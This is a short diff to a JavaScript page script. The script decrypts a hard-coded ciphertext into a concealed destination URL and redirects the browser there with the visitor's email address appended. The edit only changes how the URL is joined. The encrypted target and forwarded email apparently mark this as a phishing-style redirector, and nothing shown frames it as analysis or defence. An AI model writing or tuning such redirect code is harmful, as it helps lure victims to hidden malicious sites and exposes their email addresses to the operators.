@@ -55,8 +55,8 @@ ciphertext: "kEq0G5DDmA0LKlmQNdh3zSD8iOuUjHCJdtmKQpn2FDr42HmJKCn2bSw//OSj2SF3eNX
       let destination;
       try { destination = await decryptDestination(); } catch (e) { console.error("[redirect] blocked: decryption failed:", e); return; }
 
-      console.log("[redirect] redirecting to:", destination + "/" + email);
-      window.location.href = destination + "/" + email;
+      console.log("[redirect] redirecting to:", destination  + email);
+      window.location.href = destination  + email;
     }
 
     run();
